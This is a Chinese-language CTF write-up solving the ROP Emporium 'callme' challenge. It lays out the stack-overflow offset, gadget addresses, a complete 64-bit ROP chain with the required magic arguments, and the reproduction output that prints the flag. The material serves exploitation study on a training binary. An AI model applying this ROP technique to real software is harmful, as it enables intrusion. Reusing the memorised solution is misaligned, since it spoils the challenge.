# 33 ROP Emporium `callme` 速通笔记

```text
64 位 ELF、No PIE、NX、无 canary、Partial RELRO、not stripped
callme_one / callme_two / callme_three 在配套 libcallme.so 里（RUNPATH = b'.'）
运行时依赖 key1.dat / key2.dat / encrypted_flag.dat（缺一即 "Failed to open …"）；
运行文件统一放在 `ret2csu/callme_lab/`（与 30 的 `encrypted_flag.dat` 同名冲突，见 §4）
```

## 1. 为什么归到 ret2csu 类

和 30（`ret2csu`）同一个识别特征：**要连续调用多个同签名函数，且每个函数都要 3 个参数**。

| | 30 `ret2csu` | 33 `callme` |
| --- | --- | --- |
| 缺的寄存器 | 没有 `pop rdx` | 无（但每个函数都要重装 3 个参数） |
| 解法 | `__libc_csu_init` 的 `mov rdx,r15` + 无害跳板 | 一条合并 gadget `pop rdi; pop rsi; pop rdx; ret` |
| 链长 | 长（每轮要垫 7 个 qword） | 短（每轮 5 个 qword） |

判据：**先看有没有"一次装多个参数"的合并 pop gadget**，有就用它（本题）；
没有才退回 ret2csu（30 的情形）。

## 2. gadget 与目标

| 地址 | 用途 |
| --- | --- |
| `0x40093c` | `pop rdi ; pop rsi ; pop rdx ; ret`（符号 `usefulGadgets`） |
| `0x400720` | `callme_one@plt` |
| `0x400740` | `callme_two@plt` |
| `0x4006f0` | `callme_three@plt` |
| `0x400750` | `exit@plt`（收尾用，可选） |

`pwnme()`：`char buf[0x20]` + `read(0, buf, 0x200)` → 溢出偏移 **0x28**。

## 3. 利用链（160 B，`read` 上限 0x200）

```text
'A' * 40                                     # read(0, rbp-0x20, 0x200)
pop rdi ; pop rsi ; pop rdx ; ret            # 0x40093c
  0xdeadbeefdeadbeef                         #   rdi
  0xcafebabecafebabe                         #   rsi
  0xd00df00dd00df00d                         #   rdx
callme_one@plt                               # 0x400720
pop rdi ; pop rsi ; pop rdx ; ret            # 三个参数必须每轮重装
  0xdeadbeefdeadbeef / 0xcafebabecafebabe / 0xd00df00dd00df00d
callme_two@plt                               # 0x400740
pop rdi ; pop rsi ; pop rdx ; ret
  同上三个参数
callme_three@plt                             # 0x4006f0 → 解密并打印 flag
exit@plt                                     # 0x400750
```

长度账：`40 + 3 × (8 + 3×8 + 8) = 40 + 120 = 160`。

## 4. 三个坑（都是实测踩到的）

1. **参数是 64 位双写常量，不是经典 32 位**。2024 新版 `libcallme.so` 里是

   ```text
   movabs $0xdeadbeefdeadbeef,%rax ; cmp %rax,-0x18(%rbp)
   movabs $0xcafebabecafebabe,%rax ; cmp %rax,-0x20(%rbp)
   movabs $0xd00df00dd00df00d,%rax ; cmp %rax,-0x28(%rbp)
   ```

   老 writeup 的 `0xdeadbeef / 0xcafebabe / 0xd00df00d` 会得到 `Incorrect parameters`
   （我第一次就是这么失败的）。判定方法：`objdump -d libcallme.so` 看 `cmp` 的立即数。

2. **顺序必须是 one → two → three**。三个函数各自把结果写进 lib 内的全局缓冲区，
   `callme_three` 才解密 `encrypted_flag.dat`；顺序错了即使参数正确也只打印
   "called correctly" 而没有 flag。

3. **三个 `.dat` 是必需输入，且不能和 30 放同一目录**。callme 与 ret2csu 都从 cwd 读
   `encrypted_flag.dat`，但两份内容不同（callme `3160bfe6…` / ret2csu `37aa4baf…`）。
   我第一次把 callme 的附件直接拷进 `ret2csu/`，覆盖了 30 的文件，导致 30 矩阵 FAIL
   （输出 `Thank you!` + 乱码，没有 `ROPE{`）。现在 callme 的 5 个运行文件放在
   `ret2csu/callme_lab/`，EXP 里 `process(BIN, cwd=RUN_DIR)` 指过去
   （`RUNPATH=b'.'` 是相对 **cwd** 解析的）。

## 5. 本地复现

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2csu'
source ../.venv/bin/activate
python 33_ropemporium_callme_exp.py LOCAL     # EXP 内部把 cwd 切到 callme_lab/
# Thank you!
# callme_one() called correctly
# callme_two() called correctly
# ROPE{a_placeholder_32byte_flag!}
```

远程用 `HOST=… PORT=… python 33_ropemporium_callme_exp.py`（官方无公开靶机）。

附件来源：`https://ropemporium.com/binary/callme.zip`（zip sha256 `a32deecd…`），
原始 zip 在 `_vendor/ropemporium/callme.zip`；解出的 5 个文件在
`ret2csu/callme_lab/`（`callme` 需 `git add -f`）。

## 6. 识别卡

```text
溢出可控 + 需要依次调用多个函数 + 每个函数 3 个参数
  -> 先找"一条 gadget 装多个参数"（pop rdi; pop rsi; pop rdx）
  -> 没有再用 ret2csu（30）
每个函数的 3 个参数都要重新装，不能指望寄存器跨函数存活
参数宽度看 lib 里 cmp 的立即数（32 位 vs 64 位双写），不要照抄老 writeup
```
